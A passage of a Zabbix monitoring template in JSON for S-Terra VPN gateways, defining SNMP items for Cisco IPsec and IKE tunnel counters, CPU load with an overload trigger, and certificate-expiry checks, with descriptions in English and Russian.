                        ""description"": ""The total number of previously active IPsec Phase-1 IKE Tunnels.\n\n\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e ISAKMP SA \u0441 \u043c\u043e\u043c\u0435\u043d\u0442\u0430 \u0441\u0442\u0430\u0440\u0442\u0430 \u0410\u0433\u0435\u043d\u0442\u0430, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u0431\u044b\u043b\u0438 \u0441\u043e\u0437\u0434\u0430\u043d\u044b, \u043d\u043e \u0443\u0436\u0435 \u043d\u0435 \u044f\u0432\u043b\u044f\u044e\u0442\u0441\u044f \u0430\u043a\u0442\u0438\u0432\u043d\u044b\u043c\u0438, \u043b\u0438\u0431\u043e \u0443\u0434\u0430\u043b\u0435\u043d\u044b."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IKE Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""dbe5f1f949594cf49f354bcbb055b531"",
                        ""name"": ""Number of failed remotely initiated IPsec Phase-1 IKE Tunnels"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cikeGlobalRespTunnelFails.0"",
                        ""key"": ""cikeGlobalRespTunnelFails"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of IPsec Phase-1 IKE Tunnels which were remotely initiated and failed to activate.\n\n\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0441\u0435\u0441\u0441\u0438\u0439 \u043f\u043e \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044e ISAKMP SA, \u0438\u043d\u0438\u0446\u0438\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0445 \u043f\u0430\u0440\u0442\u043d\u0451\u0440\u0430\u043c\u0438, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u0437\u0430\u0432\u0435\u0440\u0448\u0438\u043b\u0438\u0441\u044c \u043d\u0435\u0443\u0434\u0430\u0447\u0435\u0439."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IKE Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""d6b2ec1a25f443a98839cf58381321f2"",
                        ""name"": ""Number of active IPsec tunnels"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cipSecGlobalActiveTunnels.0"",
                        ""key"": ""cipSecGlobalActiveTunnels"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of currently active IPsec Phase-2 Tunnels.\n\n\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0438\u0445 \u043d\u0430 \u0434\u0430\u043d\u043d\u044b\u0439 \u043c\u043e\u043c\u0435\u043d\u0442 IPsec \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0439. \u041f\u0435\u0440\u0438\u043e\u0434 \u043e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u044f \u0432\u0441\u0435\u0445 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0445 \u044d\u0442\u043e\u0433\u043e \u0440\u0430\u0437\u0434\u0435\u043b\u0430 (\u0413\u043b\u043e\u0431\u0430\u043b\u044c\u043d\u0430\u044f IPsec-\u0441\u0442\u0430\u0442\u0438\u0441\u0442\u0438\u043a\u0430) \u2013 1 \u0441\u0435\u043a\u0443\u043d\u0434\u0430. \u041f\u043e\u044d\u0442\u043e\u043c\u0443, \u043f\u043e\u0441\u043b\u0435 \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u044f \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 \u0432 \u0442\u0435\u0447\u0435\u043d\u0438\u0435 1 \u0441\u0435\u043a\u0443\u043d\u0434\u044b \u043d\u0430 \u043a\u043e\u043c\u043f\u044c\u044e\u0442\u0435\u0440\u0435 \u043c\u043e\u0436\u0435\u0442 \u0432\u044b\u0434\u0430\u0432\u0430\u0442\u044c\u0441\u044f \u0443\u0441\u0442\u0430\u0440\u0435\u0432\u0448\u0435\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""bf7d693101b14e4c8bd72d056039f13a"",
                        ""name"": ""Number of failed IPsec Phase-2 authentications (In)"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cipSecGlobalInAuthFails.0"",
                        ""key"": ""cipSecGlobalInAuthFails"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of inbound authentication's which ended in failure by all current and previous  IPsec Phase-2 Tunnels.\n\n\u041e\u0431\u0449\u0435\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0432\u0441\u0435\u0445 \u043d\u0435\u0443\u0434\u0430\u0447\u043d\u044b\u0445 \u0432\u0445\u043e\u0434\u044f\u0449\u0438\u0445 \u0430\u0443\u0442\u0435\u043d\u0442\u0438\u0444\u0438\u043a\u0430\u0446\u0438\u0439 \u043f\u043e IPsec \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u044f\u043c."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""b894926f83ce4abc8e5f605ec8c402eb"",
                        ""name"": ""Number of failed IPsec Phase-2 decryptions (In)"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cipSecGlobalInDecryptFails.0"",
                        ""key"": ""cipSecGlobalInDecryptFails"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of inbound decryption's which ended in failure by all current and previous IPsec Phase-2 Tunnels.\n\n\u041e\u0431\u0449\u0435\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0432\u0445\u043e\u0434\u044f\u0449\u0438\u0445 \u043f\u0430\u043a\u0435\u0442\u043e\u0432, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u0431\u044b\u043b\u0438 \u043d\u0435\u0443\u0434\u0430\u0447\u043d\u043e \u0440\u0430\u0441\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u044b IPsec \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u044f\u043c\u0438."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""346bb9dc626343dfbccbc13af561b3dc"",
                        ""name"": ""Number of dropped IPsec packets (In)"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cipSecGlobalInDrops.0"",
                        ""key"": ""cipSecGlobalInDrops"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of packets dropped during receive processing by all current and previous IPsec Phase-2 Tunnels. This count does NOT include packets dropped due to Anti-Replay processing.\n\n\u041e\u0431\u0449\u0435\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0432\u0441\u0435\u0445 \u0432\u0445\u043e\u0434\u044f\u0449\u0438\u0445 \u043f\u0430\u043a\u0435\u0442\u043e\u0432, \u043e\u0442\u0432\u0435\u0440\u0433\u043d\u0443\u0442\u044b\u0445 \u043b\u043e\u043a\u0430\u043b\u044c\u043d\u044b\u043c \u0443\u0441\u0442\u0440\u043e\u0439\u0441\u0442\u0432\u043e\u043c, \u043f\u0440\u0438 \u0437\u0430\u0434\u0435\u0439\u0441\u0442\u0432\u043e\u0432\u0430\u043d\u0438\u0438 IPsec \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u044f (\u041a\u0440\u043e\u043c\u0435 \u043f\u0440\u043e\u0438\u0433\u043d\u043e\u0440\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0445 \u043f\u043e Anti-Replay)."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""5d596f483cad4e70aee62010941164ac"",
                        ""name"": ""Number of IPsec Phase-2 decryptions in bytes (In)"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cipSecGlobalInOctets.0"",
                        ""key"": ""cipSecGlobalInOctets"",
                        ""delay"": ""30s"",
                        ""units"": ""B"",
                        ""description"": ""The total number of inbound decryption's performed by all current and previous IPsec Phase-2 Tunnels.\n\n\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0431\u0430\u0439\u0442, \u043f\u0440\u0438\u043d\u044f\u0442\u044b\u0445 \u043f\u043e\u0434 \u0437\u0430\u0449\u0438\u0442\u043e\u0439 \u0432\u0441\u0435\u0445 IPsec SA \u0441 \u043c\u043e\u043c\u0435\u043d\u0442\u0430 \u0441\u0442\u0430\u0440\u0442\u0430 \u0410\u0433\u0435\u043d\u0442\u0430."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""7fbb272a97d94b44a8a5905a96afa49f"",
                        ""name"": ""Total number of IPsec Phase-2 decryptions in bytes (In)"",
                        ""type"": ""CALCULATED"",
                        ""key"": ""cipSecGlobalInOctetsTotal"",
                        ""delay"": ""30s"",
                        ""units"": ""B"",
                        ""params"": ""4294967296*last(//cipSecGlobalInOctWraps)+last(//cipSecGlobalInOctets)"",
                        ""description"": ""Total number of IPsec Phase-2 decryptions in bytes (In)\n\n\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0431\u0430\u0439\u0442, \u043f\u0440\u0438\u043d\u044f\u0442\u044b\u0445 \u043f\u043e\u0434 \u0437\u0430\u0449\u0438\u0442\u043e\u0439 \u0432\u0441\u0435\u0445 IPsec SA \u0441 \u043c\u043e\u043c\u0435\u043d\u0442\u0430 \u0441\u0442\u0430\u0440\u0442\u0430 \u0428\u043b\u044e\u0437\u0430 \u0441 \u0443\u0447\u0435\u0442\u043e\u043c \u043f\u0435\u0440\u0435\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u044f 32 \u0431\u0438\u0442\u043d\u043e\u0433\u043e \u0441\u0447\u0435\u0442\u0447\u0438\u043a\u0430."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""5ae84fb603114b1fa669a93ad9163edf"",
                        ""name"": ""The number of times the global octets received counter (cipSecGlobalInOctets) has wrapped"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cipSecGlobalInOctWraps.0"",
                        ""key"": ""cipSecGlobalInOctWraps"",
                        ""delay"": ""30s"",
                        ""description"": ""The number of times the global octets received counter (cipSecGlobalInOctets) has wrapped.\n\n\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043f\u0435\u0440\u0435\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0439 \u0441\u0447\u0435\u0442\u0447\u0438\u043a\u0430 cipSecGlobalInOctets."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""4c6e2d546f46495db4ee947d27b50eed"",
                        ""name"": ""Number of received IPsec packets"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cipSecGlobalInPkts.0"",
                        ""key"": ""cipSecGlobalInPkts"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of packets received by all current and previous IPsec Phase-2 Tunnels.\n\n\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043f\u0430\u043a\u0435\u0442\u043e\u0432, \u043f\u0440\u0438\u043d\u044f\u0442\u044b\u0445 \u043f\u043e\u0434 \u0437\u0430\u0449\u0438\u0442\u043e\u0439 \u0432\u0441\u0435\u0445 IPsec SA \u0441 \u043c\u043e\u043c\u0435\u043d\u0442\u0430 \u0441\u0442\u0430\u0440\u0442\u0430 \u0410\u0433\u0435\u043d\u0442\u0430."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""963608df62314afe9c71f9b6f105ef58"",
                        ""name"": ""Number of IPsec packets dropped due to Anti-Replay (In)"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cipSecGlobalInReplayDrops.0"",
                        ""key"": ""cipSecGlobalInReplayDrops"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of packets dropped during receive processing due to Anti-Replay processing by all current and previous IPsec Phase-2 Tunnels.\n\n\u041e\u0431\u0449\u0435\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0432\u0441\u0435\u0445 \u0432\u0445\u043e\u0434\u044f\u0449\u0438\u0445 \u043f\u0430\u043a\u0435\u0442\u043e\u0432, \u043e\u0442\u0432\u0435\u0440\u0433\u043d\u0443\u0442\u044b\u0445 \u043b\u043e\u043a\u0430\u043b\u044c\u043d\u044b\u043c\n\u0443\u0441\u0442\u0440\u043e\u0439\u0441\u0442\u0432\u043e\u043c \u043f\u043e\u0441\u0440\u0435\u0434\u0441\u0442\u0432\u043e\u043c \u043c\u0435\u0445\u0430\u043d\u0438\u0437\u043c\u0430 Anti-Replay, \u043f\u0440\u0438 \u0437\u0430\u0434\u0435\u0439\u0441\u0442\u0432\u043e\u0432\u0430\u043d\u0438\u0438 IPsec \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u044f."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""6336018a799146abb35c540e0c748571"",
                        ""name"": ""Number of non-existent SA failures in IPsec Phase-2 tunnels"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cipSecGlobalNoSaFails.0"",
                        ""key"": ""cipSecGlobalNoSaFails"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of non-existent Security Assocication in failures which occurred during processing of all current and previous IPsec Phase-2 Tunnels.\n\n\u041e\u0431\u0449\u0435\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043e\u0431\u043c\u0435\u043d\u043e\u0432, \u043d\u0435 \u0441\u043e\u0441\u0442\u043e\u044f\u0432\u0448\u0438\u0445\u0441\u044f \u043f\u043e \u043f\u0440\u0438\u0447\u0438\u043d\u0435 \u043e\u0442\u0441\u0443\u0442\u0441\u0442\u0432\u0438\u044f IPsec \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u044f."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""4b559fb80f5a4213811ba7b554d46548"",
                        ""name"": ""Number of failed IPsec Phase-2 authentications (Out)"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cipSecGlobalOutAuthFails.0"",
                        ""key"": ""cipSecGlobalOutAuthFails"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of outbound authentication's which ended in failure by all current and previous IPsec Phase-2 Tunnels.\n\n\u041e\u0431\u0449\u0435\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0432\u0441\u0435\u0445 \u043d\u0435\u0443\u0434\u0430\u0447\u043d\u044b\u0445 \u0438\u0441\u0445\u043e\u0434\u044f\u0449\u0438\u0445 \u0430\u0443\u0442\u0435\u043d\u0442\u0438\u0444\u0438\u043a\u0430\u0446\u0438\u0439 \u043f\u043e IPsec \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u044f\u043c."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""61836d0e817c4defb3e980b568cae89e"",
                        ""name"": ""Number of dropped IPsec packets (Out)"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cipSecGlobalOutDrops.0"",
                        ""key"": ""cipSecGlobalOutDrops"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of packets dropped during send processing by all current and previous IPsec Phase-2 Tunnels.\n\n\u041e\u0431\u0449\u0435\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0432\u0441\u0435\u0445 \u0438\u0441\u0445\u043e\u0434\u044f\u0449\u0438\u0445 \u043f\u0430\u043a\u0435\u0442\u043e\u0432, \u043e\u0442\u0432\u0435\u0440\u0433\u043d\u0443\u0442\u044b\u0445 \u043b\u043e\u043a\u0430\u043b\u044c\u043d\u044b\u043c \u0443\u0441\u0442\u0440\u043e\u0439\u0441\u0442\u0432\u043e\u043c, \u043f\u0440\u0438 \u0437\u0430\u0434\u0435\u0439\u0441\u0442\u0432\u043e\u0432\u0430\u043d\u0438\u0438 IPsec \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u044f."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""4bd2f2e09e6e4f049115a5003a9c193b"",
                        ""name"": ""Number of failed IPsec Phase-2 encryptions (Out)"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cipSecGlobalOutEncryptFails.0"",
                        ""key"": ""cipSecGlobalOutEncryptFails"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of outbound encryption's which ended in failure by all current and previous IPsec Phase-2 Tunnels.\n\n\u041e\u0431\u0449\u0435\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0438\u0441\u0445\u043e\u0434\u044f\u0449\u0438\u0445 \u043f\u0430\u043a\u0435\u0442\u043e\u0432, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u0431\u044b\u043b\u0438 \u043d\u0435\u0443\u0434\u0430\u0447\u043d\u043e \u0437\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u044b IPsec \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u044f\u043c\u0438."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""e937ddcf14c44cfca176ca5258536975"",
                        ""name"": ""Total number of IPsec Phase-2 encryptions in bytes (Out)"",
                        ""type"": ""CALCULATED"",
                        ""key"": ""cipSecGlobalOutEncryptsTotal"",
                        ""delay"": ""30s"",
                        ""units"": ""B"",
                        ""params"": ""4294967296*last(//cipSecGlobalOutOctWraps)+last(//cipSecGlobalOutOctets)"",
                        ""description"": ""Total number of IPsec Phase-2 encryptions in bytes (Out)\n\n\u041e\u0431\u0449\u0435\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0431\u0430\u0439\u0442, \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u043d\u044b\u0445 \u043f\u043e\u0434 \u0437\u0430\u0449\u0438\u0442\u043e\u0439 \u0432\u0441\u0435\u0445 IPsec SA \u0441 \u043c\u043e\u043c\u0435\u043d\u0442\u0430 \u0441\u0442\u0430\u0440\u0442\u0430 \u0428\u043b\u044e\u0437\u0430 \u0441 \u0443\u0447\u0435\u0442\u043e\u043c \u043f\u0435\u0440\u0435\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u044f 32 \u0431\u0438\u0442\u043d\u043e\u0433\u043e \u0441\u0447\u0435\u0442\u0447\u0438\u043a\u0430."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""a67f511e5468411b9821924bfe970d46"",
                        ""name"": ""Number of IPsec Phase-2 encryptions in bytes (Out)"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cipSecGlobalOutOctets.0"",
                        ""key"": ""cipSecGlobalOutOctets"",
                        ""delay"": ""30s"",
                        ""units"": ""B"",
                        ""description"": ""The total number of outbound encryption's performed by all current and previous IPsec Phase-2 Tunnels.\n\n\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0431\u0430\u0439\u0442, \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u043d\u044b\u0445 \u043f\u043e\u0434 \u0437\u0430\u0449\u0438\u0442\u043e\u0439 \u0432\u0441\u0435\u0445 IPsec SA \u0441 \u043c\u043e\u043c\u0435\u043d\u0442\u0430 \u0441\u0442\u0430\u0440\u0442\u0430 \u0410\u0433\u0435\u043d\u0442\u0430."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""3ca20d7ebb704801896c1573d1f788db"",
                        ""name"": ""The number of times the global octets sent counter (cipSecGlobalOutOctets) has wrapped"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cipSecGlobalOutOctWraps.0"",
                        ""key"": ""cipSecGlobalOutOctWraps"",
                        ""delay"": ""30s"",
                        ""description"": ""The number of times the global octets sent counter (cipSecGlobalOutOctets) has wrapped\n\n\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043f\u0435\u0440\u0435\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0439 \u0441\u0447\u0435\u0442\u0447\u0438\u043a\u0430 cipSecGlobalOutOctets."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""d7cd1d301db74b43ab8759420928bf12"",
                        ""name"": ""Number of sent IPsec packets"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cipSecGlobalOutPkts.0"",
                        ""key"": ""cipSecGlobalOutPkts"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of packets sent by all current and previous IPsec Phase-2 Tunnels.\n\n\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043f\u0430\u043a\u0435\u0442\u043e\u0432, \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u043d\u044b\u0445 \u043f\u043e\u0434 \u0437\u0430\u0449\u0438\u0442\u043e\u0439 \u0432\u0441\u0435\u0445 IPsec SA \u0441 \u043c\u043e\u043c\u0435\u043d\u0442\u0430 \u0441\u0442\u0430\u0440\u0442\u0430 \u0410\u0433\u0435\u043d\u0442\u0430."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""528f87336bb74ae58d1312fdcc2a437d"",
                        ""name"": ""Number of previously active IPsec tunnels"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-IPSEC-FLOW-MONITOR-MIB::cipSecGlobalPreviousTunnels.0"",
                        ""key"": ""cipSecGlobalPreviousTunnels"",
                        ""delay"": ""30s"",
                        ""description"": ""The total number of previously active IPsec Phase-2 Tunnels.\n\n\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e IPsec SA \u0441 \u043c\u043e\u043c\u0435\u043d\u0442\u0430 \u0441\u0442\u0430\u0440\u0442\u0430 \u0410\u0433\u0435\u043d\u0442\u0430, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u0431\u044b\u043b\u0438 \u0441\u043e\u0437\u0434\u0430\u043d\u044b, \u043d\u043e \u0443\u0436\u0435 \u043d\u0435 \u044f\u0432\u043b\u044f\u044e\u0442\u0441\u044f \u0430\u043a\u0442\u0438\u0432\u043d\u044b\u043c\u0438, \u043b\u0438\u0431\u043e \u0443\u0434\u0430\u043b\u0435\u043d\u044b."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""IPsec Monitoring""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""6fef0b87986a413f92003b8effe221b9"",
                        ""name"": ""CPU load"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""CISCO-SMI::local.1.56.0"",
                        ""key"": ""cpu_load_5s_avg"",
                        ""delay"": ""10s"",
                        ""units"": ""%"",
                        ""description"": ""Average CPU load percent for 5 seconds.\n\n\u0421\u0440\u0435\u0434\u043d\u044f\u044f \u0437\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u043e\u0440\u0430 \u0432 \u0442\u0435\u0447\u0435\u043d\u0438\u0438 5 \u0441\u0435\u043a\u0443\u043d\u0434 (\u0432 \u043f\u0440\u043e\u0446\u0435\u043d\u0442\u0430\u0445)."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""System Monitoring""
                            }
                        ],
                        ""triggers"": [
                            {
                                ""uuid"": ""e40ba1f4042a44f48fdc839db221fcf1"",
                                ""expression"": ""avg(/S-Terra Gates SNMPv2/cpu_load_5s_avg,600s)>80"",
                                ""name"": ""CPU overload"",
                                ""priority"": ""WARNING"",
                                ""description"": ""Average CPU load exceeds 80% for over 10 minutes!\n\n\u041f\u0440\u043e\u0446\u0435\u0441\u0441\u043e\u0440 \u043f\u0435\u0440\u0435\u0433\u0440\u0443\u0436\u0435\u043d: \u0437\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u043e\u0440\u0430 \u043f\u0440\u0435\u0432\u044b\u0448\u0430\u0435\u0442 80% \u0432 \u0442\u0435\u0447\u0435\u043d\u0438\u0438 10 \u043c\u0438\u043d\u0443\u0442!"",
                                ""manual_close"": ""YES""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""63a37530b3f24dceada3418c9486f891"",
                        ""name"": ""Days until local certificate expires"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""NET-SNMP-EXTEND-MIB::nsExtendOutputFull.\""get_days_until_local_cert_exp\"""",
                        ""key"": ""get_days_until_local_cert_exp"",
                        ""delay"": ""0;h0,12"",
                        ""units"": ""d"",
                        ""description"": ""Number of days until certificate expiration.\nThis item uses information form custom OID.\n\nThis item will be polled at 00:00 and at 12:00.\n\n\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0434\u043d\u0435\u0439 \u0434\u043e \u0438\u0441\u0442\u0435\u0447\u0435\u043d\u0438\u044f \u0441\u0440\u043e\u043a\u0430 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044f \u043b\u043e\u043a\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u0441\u0435\u0440\u0442\u0438\u0444\u0438\u043a\u0430\u0442\u0430.\n\u0414\u043b\u044f \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u044f \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u0438 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442\u0441\u044f \u043e\u0442\u0434\u0435\u043b\u044c\u043d\u043e \u0441\u043e\u0437\u0434\u0430\u043d\u043d\u044b\u0439 OID.\n\n\u0417\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u0437\u0430\u043f\u0440\u0430\u0448\u0438\u0432\u0430\u0435\u0442\u0441\u044f \u0432 00:00 \u0438 \u0432 12:00."",
                        ""tags"": [
                            {
                                ""tag"": ""Application"",
                                ""value"": ""Extended""
                            }
                        ]
                    },
                    {
                        ""uuid"": ""44c30215865740dab7351bf04ab3d3b9"",
                        ""name"": ""Days until local certificate expires (script exit code)"",
                        ""type"": ""SNMP_AGENT"",
                        ""snmp_oid"": ""NET-SNMP-EXTEND-MIB::nsExtendResult.\""get_days_until_local_cert_exp\"""",
                        ""key"": ""get_days_until_local_cert_exp_res"",
                        ""delay"": ""0;h0,12"",
